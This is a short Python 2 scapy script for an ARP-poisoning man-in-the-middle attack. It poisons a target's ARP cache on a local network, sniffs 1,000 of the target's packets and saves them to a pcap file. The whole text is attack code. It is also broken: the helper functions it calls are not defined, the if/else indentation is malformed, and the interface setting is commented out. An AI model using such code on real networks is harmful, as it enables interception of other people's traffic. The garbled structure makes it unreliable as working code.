from scapy.all import *
import os
import sys
import threading
import signal

interface = "ens10"
target_ip = "192.168.13.31"
server_ip = "192.168.13.30"
packet_count = 1000

# set our interface conf.iface = interface
# turn off output

conf.verb = 0

print "[*] Setting up %s" % interface

server_mac = get_mac(server_ip)

if server_mac is None:
    print "[!!!] Failed to get server MAC. Exiting."
    sys.exit(0)

else:
    print "[*] server %s is at %s" % (server_ip, server_mac)
    target_mac = get_mac(target_ip)
    if target_mac is None:
    print "[!!!] Failed to get target MAC. Exiting."
    sys.exit(0)

else:
    print  "[*] Target %s is at %s" % (target_ip, target_mac)
    # start poison thread
    poison_thread = threading.Thread(target = poison_target, args = (server_ip, server_mac, target_ip, target_mac)) 
    poison_thread.start()
    try:
        print "[*] Starting sniffer for %d packets" % packet_count
        bpf_filter = "ip host %s" % target_ip
        packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)
        # write out the captured packets
        wrpcap('arper.pcap', packets)
        # restore the network                        
        restore_target(server_ip, server_mac, target_ip, target_mac)

    except KeyboardInterrupt:

        # restore the network     
        restore_target(server_ip, server_mac, target_ip, target_mac)
        sys.exit(0)

